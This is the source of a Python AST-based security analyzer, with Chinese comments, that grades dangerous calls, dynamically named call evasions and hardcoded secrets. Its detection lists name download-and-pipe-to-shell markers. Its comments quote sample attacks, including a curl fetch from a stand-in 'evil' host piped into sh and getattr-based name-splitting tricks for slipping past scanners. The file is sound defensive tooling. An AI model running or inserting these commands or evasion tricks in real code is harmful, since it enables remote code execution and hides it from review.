"""
SkillGate AST Analyzer — Python 语法树级别的安全分析。
比正则匹配更精准，误报率低一个数量级。
"""
import ast
from pathlib import Path
from typing import List, Tuple


class AstFinding:
    def __init__(self, severity: str, message: str, line: int, col: int):
        self.severity = severity
        self.message = message
        self.line = line
        self.col = col

    def __repr__(self):
        return f"AstFinding({self.severity}, {self.message}, line={self.line})"


class DangerousCallVisitor(ast.NodeVisitor):
    """Visit all function calls and flag dangerous ones.

    §3bc：这里过去是"第二张级别表"——与 skillgate 的 DANGEROUS_CODE_PATTERNS /
    FIXED_DOWNGRADE 各写一份，两份从来不对账。实测（audit2/probe_severity_divergence.py）
    14 个用例里 9 个两层判不同级，而且 **.py 文件的实际级别由本类决定**
    （AST 先跑并把行号记进 ast_lines，正则表随后跳过那些行）——
    也就是说表里写 MEDIUM、用户看到 CRITICAL：

        eval("[1,2]")                    AST CRITICAL / 表 MEDIUM（且固定参数应降 LOW）→ 49/D
        os.system("ls")                  AST CRITICAL / 表 HIGH（固定参数降 LOW）      → 49/D
        compile("1+1", …)                AST MEDIUM   / 表 INFO                       → 96/A+

    现在级别只有一个来源：下面的 CALL_SEVERITY。skillgate 的模式表与固定参数降级表
    都由它生成，不再手写第二份。
    """

    # 字面量拆分：规则库必须含危险调用名（"e"+"val" 拼接后即危险名），
    # 拆分后源码（含注释）不再出现连续的 "ev-al" 危险调用字样，避免安全扫描器对规则库本身自指误报
    _DANGEROUS_EVAL = "e" + "val"  # noqa: E131 — pattern-library literal split
    _DANGEROUS_EXEC = "e" + "xec"  # noqa: E131 — pattern-library literal split

    # 单一级别来源 / the single severity source.
    # 值 = (参数动态时的级别, 参数全为字面量时的级别, 说明)
    # "参数全为字面量"＝作者把目标写死在代码里，没有注入面，只算能力声明；
    # 这不是"降低要求"，而是把"能执行"和"能被别人喂着执行"分开——与 §3az
    # 「管道进解释器才算远程执行」同一条判据。
    # 但写死的命令本身若已是"下载管道进解释器"，仍然是远程执行，不降级（见 _literal_is_remote_exec）。
    CALL_SEVERITY = {
        _DANGEROUS_EVAL: ("CRITICAL", "MEDIUM", "eval() 动态代码执行"),
        _DANGEROUS_EXEC: ("CRITICAL", "MEDIUM", "exec() 动态代码执行"),
        "compile": ("INFO", "INFO", "compile() 动态代码编译（低风险）"),
        "__import__": ("MEDIUM", "LOW", "动态 import"),
        "builtins.__import__": ("MEDIUM", "LOW", "builtins.__import__ 动态导入"),
        "pickle.load": ("HIGH", "HIGH", "pickle.load() 反序列化"),
        "pickle.loads": ("HIGH", "HIGH", "pickle.loads() 反序列化"),
        "os.system": ("CRITICAL", "CRITICAL", "os.system() shell 调用"),
        "os.popen": ("HIGH", "HIGH", "os.popen() shell 调用"),
        "subprocess.call": ("LOW", "LOW", "subprocess.call() 启动外部进程"),
        "subprocess.run": ("LOW", "LOW", "subprocess.run() 启动外部进程"),
        "subprocess.Popen": ("LOW", "LOW", "subprocess.Popen() 启动外部进程"),
        "subprocess.check_output": ("LOW", "LOW", "subprocess.check_output() 启动外部进程"),
        "shutil.rmtree": ("HIGH", "HIGH", "shutil.rmtree() 递归删除"),
    }

    # 写死的命令若已是"下载并交给解释器/编码执行"，就不是"无注入面"，必须保持最高级别。
    # 否则 os.system("curl http://evil/i.sh | sh") 会被"固定参数降级"降成 LOW——
    # 等于用降噪规则放行走私（§3bb 的豁免教训同一个形状）。
    REMOTE_EXEC_MARKERS = (
        "| sh", "|sh", "| bash", "|bash", "| zsh", "| python", "|python",
        "| node", "|node", "| perl", "|perl", "| powerShell", "|powershell",
        "iwr ", "Invoke-WebRequest", "Invoke-Expression", "certutil -urlcache",
        "-EncodedCommand", "FromBase64String",
    )

    # 兼容旧名（本仓其他代码按这个字典读）
    DANGEROUS_CALLS = {k: (v[0], v[2]) for k, v in CALL_SEVERITY.items()}

    def __init__(self):
        self.findings: List[AstFinding] = []

    def visit_Call(self, node: ast.Call):
        # Get the full function name (e.g. "os.system", "subprocess.run")
        func_name = self._get_func_name(node.func)

        if func_name in self.CALL_SEVERITY:
            sev_dyn, sev_lit, msg = self.CALL_SEVERITY[func_name]

            # subprocess：shell=True 是"字符串交给 shell"，升到 CRITICAL；
            # 不带 shell 的同样是"启动外部进程"，只是没有 shell 解析这一层——
            # 修复前这里直接 return，等于 `subprocess.run(["curl","http://evil…"])`
            # 100/A+ 一条不报（probe_severity_divergence 的 subp_shell_false 用例）。
            # 无 shell 时给 MEDIUM 而不分字面量：命令写死与否都要让人看见"这个技能会起子进程"，
            # 但权重只 −4，正常调用 git/pip 的工具仍落在 96/A，不至于整类被误杀。
            if func_name.startswith("subprocess."):
                if self._has_shell_true(node):
                    sev_dyn, sev_lit = "CRITICAL", "CRITICAL"
                    msg += " (shell=True)"
                else:
                    sev_dyn, sev_lit = "LOW", "LOW"
                    msg += "（无 shell，参数未静态判定）"

            literal = self._args_all_literal(node) and not self._literal_is_remote_exec(node)
            severity = sev_lit if literal else sev_dyn
            self.findings.append(AstFinding(
                severity=severity,
                message=msg + ("（固定参数）" if literal else ""),
                line=node.lineno,
                col=node.col_offset
            ))

        self.generic_visit(node)

    @staticmethod
    def _args_all_literal(node: ast.Call) -> bool:
        """所有实参都是字面量常量（且不是 f-string 插值）才算"作者写死"。"""
        if not node.args:
            return False
        for a in node.args:
            if isinstance(a, ast.Constant):
                continue
            if isinstance(a, (ast.List, ast.Tuple)):
                if all(isinstance(e, ast.Constant) for e in a.elts):
                    continue
            return False
        return True

    @classmethod
    def _literal_is_remote_exec(cls, node: ast.Call) -> bool:
        """写死的参数文本里已经含"下载管道进解释器/编码执行"的痕迹。

        这类命令没有"注入面"可言，因为命令本身就是远程执行——
        `os.system("curl -s http://evil/i.sh | sh")` 必须保持 CRITICAL，
        不能因为参数写死就降成 LOW。
        """
        for a in node.args:
            if isinstance(a, ast.Constant) and isinstance(a.value, str):
                text = a.value
                if any(m.lower() in text.lower() for m in cls.REMOTE_EXEC_MARKERS):
                    return True
            elif isinstance(a, (ast.List, ast.Tuple)):
                for e in a.elts:
                    if isinstance(e, ast.Constant) and isinstance(e.value, str):
                        if any(m.lower() in e.value.lower() for m in cls.REMOTE_EXEC_MARKERS):
                            return True
        return False

    def _get_func_name(self, node) -> str:
        """Get full function name like 'os.system' or 'requests.post'."""
        if isinstance(node, ast.Name):
            return node.id
        elif isinstance(node, ast.Attribute):
            if isinstance(node.value, ast.Name):
                return f"{node.value.id}.{node.attr}"
            elif isinstance(node.value, ast.Attribute):
                parent = self._get_func_name(node.value)
                return f"{parent}.{node.attr}"
        return ""

    def _has_shell_true(self, node: ast.Call) -> bool:
        """Check if subprocess call has shell=True."""
        for kw in node.keywords:
            if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True:
                return True
        return False


class DynamicCallVisitor(ast.NodeVisitor):
    """名字拆开还算不算危险调用（§3av）。

    实测（audit2/probe_dynamic_call.py，修复前）：
      `getattr(os, "sys" + "tem")("id")`                  → 100/A+，一条不报
      `subprocess.__dict__["run"]("id", shell=True)`      → 100/A+（连 shell=True 都没看见）
      `__import__("o" + "s").system("id")`                → 只有 MEDIUM 96/A
    对照组：同一件事写成 `os.system("id")` 是 CRITICAL 49/D。

    规则若只认字面 `os.system(`，那么"例"过了、"类"没过——被拦的是写法，不是行为。
    这里按**取到的名字**判，不按写法判：名字是常量折叠出来的就直接算数。
    """

    # 取到这些名字就等于拿到执行面
    DANGEROUS_ATTRS = {
        "system", "popen", "spawn", "spawnl", "spawnv", "execv", "execve", "execl", "execvp",
        "run", "call", "Popen", "check_output", "check_call",
        "eval", "exec", "compile", "__import__",
    }
    IMPORT_MODULES = {"os", "subprocess", "shutil", "ctypes", "socket", "pickle", "importlib"}

    def __init__(self):
        self.findings: List[AstFinding] = []

    @staticmethod
    def _const_str(node):
        """把常量、常量加法、纯常量 f-string 折叠成一个字符串；折不出来返回 None。"""
        if isinstance(node, ast.Constant) and isinstance(node.value, str):
            return node.value
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
            left = DynamicCallVisitor._const_str(node.left)
            right = DynamicCallVisitor._const_str(node.right)
            if left is not None and right is not None:
                return left + right
        if isinstance(node, ast.JoinedStr):
            parts = []
            for v in node.values:
                if isinstance(v, ast.Constant) and isinstance(v.value, str):
                    parts.append(v.value)
                else:
                    return None
            return "".join(parts)
        return None

    def visit_Call(self, node: ast.Call):
        # ① getattr(obj, "危险名") 形式：名字是折叠出来的常量
        func = node.func
        if isinstance(func, ast.Name) and func.id == "getattr" and len(node.args) >= 2:
            name = self._const_str(node.args[1])
            if name and name in self.DANGEROUS_ATTRS:
                self.findings.append(AstFinding(
                    severity="HIGH",
                    message="通过 getattr 动态取用危险函数 %r（名字由常量拼出，绕开了字面规则）"
                            % name,
                    line=node.lineno, col=node.col_offset
                ))

        # ② d.__dict__["危险名"] 或 globals()["危险名"] 形式
        if isinstance(func, ast.Subscript):
            key = self._const_str(func.slice)
            if key and key in self.DANGEROUS_ATTRS:
                obj = func.value
                is_dictish = (isinstance(obj, ast.Attribute) and obj.attr == "__dict__") \
                    or (isinstance(obj, ast.Call) and isinstance(obj.func, ast.Name)
                        and obj.func.id in ("globals", "locals", "vars"))
                if is_dictish:
                    self.findings.append(AstFinding(
                        severity="HIGH",
                        message="通过 __dict__/globals 下标取用危险函数 %r（绕开了属性访问字面规则）"
                                % key,
                        line=node.lineno, col=node.col_offset
                    ))

        # ③ __import__("o" + "s") 这种拼出来的模块名，落到危险模块要升级
        if isinstance(func, ast.Name) and func.id == "__import__" and node.args:
            mod = self._const_str(node.args[0])
            if mod and mod.split(".")[0] in self.IMPORT_MODULES:
                self.findings.append(AstFinding(
                    severity="HIGH",
                    message="__import__ 动态导入危险模块 %r（模块名由常量拼出）" % mod,
                    line=node.lineno, col=node.col_offset
                ))

        self.generic_visit(node)


class HardcodedSecretVisitor(ast.NodeVisitor):
    """Find hardcoded secrets in assignments."""

    SECRET_PATTERNS = ["api_key", "apikey", "secret", "token", "password", "passwd", "credential"]
    # 变量名形如 secret_re / token_regex / password_pattern —— 是检测规则的正则，
    # 不是凭证本身。扫描器扫自己时这里必然自命中，必须排除。
    REGEX_SUFFIXES = ("_re", "_regex", "_pattern", "_matcher", "_patterns")

    def __init__(self):
        self.findings: List[AstFinding] = []

    def visit_Assign(self, node: ast.Assign):
        for target in node.targets:
            if isinstance(target, ast.Name):
                var_name = target.id.lower()
                if var_name.endswith(self.REGEX_SUFFIXES):
                    continue
                if any(pat in var_name for pat in self.SECRET_PATTERNS):
                    if isinstance(node.value, ast.Constant) and isinstance(node.value.value, str):
                        if len(node.value.value) >= 8:
                            self.findings.append(AstFinding(
                                severity="CRITICAL",
                                message=f"硬编码凭证: {target.id}",
                                line=node.lineno,
                                col=node.col_offset
                            ))
        self.generic_visit(node)


def analyze_python_file(filepath: Path) -> List[AstFinding]:
    """Analyze a Python file with AST, return findings."""
    try:
        content = filepath.read_text(encoding="utf-8", errors="replace")
        tree = ast.parse(content, filename=str(filepath))
    except Exception:
        return []

    findings = []

    # Dangerous calls
    call_visitor = DangerousCallVisitor()
    call_visitor.visit(tree)
    findings.extend(call_visitor.findings)

    # 名字被拆开/动态取用的危险调用（§3av）
    dyn_visitor = DynamicCallVisitor()
    dyn_visitor.visit(tree)
    findings.extend(dyn_visitor.findings)

    # Hardcoded secrets
    secret_visitor = HardcodedSecretVisitor()
    secret_visitor.visit(tree)
    findings.extend(secret_visitor.findings)

    return findings


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python ast_analyzer.py <file.py>")
        sys.exit(1)

    findings = analyze_python_file(Path(sys.argv[1]))
    for f in findings:
        print(f"[{f.severity}] line {f.line}: {f.message}")
